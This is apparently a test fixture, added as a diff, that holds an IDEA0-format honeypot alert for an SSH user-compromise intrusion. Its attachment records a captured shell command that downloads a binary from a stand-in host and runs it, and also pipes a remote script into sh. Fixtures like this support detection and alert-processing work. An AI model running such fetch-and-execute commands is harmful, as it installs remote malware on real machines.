@@ -1,0 +1,12 @@
+{
+  "Format": "IDEA0",
+  "ID": "6b7d0a6e-0000-4000-8000-000000000001",
+  "DetectTime": "2026-01-01T10:00:00Z",
+  "Category": ["Intrusion.UserCompromise"],
+  "Source": [{"IP4": ["198.51.100.7"], "Proto": ["tcp", "ssh"]}],
+  "Target": [{"IP4": ["203.0.113.5"], "Port": [22]}],
+  "Node": [{"Name": "cz.cesnet.hugo.cowrie", "SW": ["hugo-cowrie"], "Type": ["Honeypot", "Connection"]}],
+  "Attach": [
+    {"Type": ["ShellCode"], "Content": "['cd /tmp; wget http://evil.test/bins/x86 -O x; chmod +x x; ./x; curl -s http://evil.test/a.sh | sh']"}
+  ]
+}
